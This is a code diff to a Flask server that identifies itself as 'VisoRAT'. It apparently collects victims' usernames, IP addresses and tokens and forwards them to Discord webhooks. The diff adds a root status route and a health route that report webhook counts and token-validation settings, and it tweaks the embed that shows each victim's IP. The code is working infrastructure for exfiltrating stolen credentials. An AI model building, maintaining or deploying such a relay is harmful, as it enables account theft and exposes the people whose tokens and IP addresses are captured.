@@ -126,6 +126,7 @@ def send_to_discord_webhook(webhook_config, username, ip, token, endpoint, head_
     try:
         description = f""".
 🌐 **IP Address**:
+
 ```
 {ip}
 ```
@@ -198,6 +199,40 @@ def send_to_all_webhooks(endpoint_config, username, ip, token, endpoint_path, he
     return results
 
 config = load_config()
+
+# Add root route to fix 404 error
+@app.route('/')
+def root():
+    if not config:
+        return jsonify({"status": "error", "message": "Configuration not loaded"}), 500
+    
+    endpoint_info = {}
+    for path, endpoint_config in config.get('endpoints', {}).items():
+        endpoint_info[path] = {
+            "webhooks_count": len(endpoint_config.get('webhooks', [])),
+            "methods": ["POST"]
+        }
+    
+    return jsonify({
+        "service": "VisoRAT",
+        "status": "running",
+        "endpoints": endpoint_info,
+        "security": {
+            "rate_limit_seconds": config.get('security', {}).get('rate_limit_seconds', 600),
+            "min_token_length": config.get('security', {}).get('min_token_length', 128),
+            "check_duplicate_tokens": config.get('security', {}).get('check_duplicate_tokens', True)
+        },
+        "timestamp": datetime.utcnow().isoformat()
+    }), 200
+
+# Add health check endpoint
+@app.route('/health')
+def health():
+    return jsonify({
+        "status": "healthy", 
+        "timestamp": datetime.utcnow().isoformat()
+    }), 200
+
 if config and 'endpoints' in config:
     endpoints = config.get('endpoints', {})
     security_config = config.get('security', {})
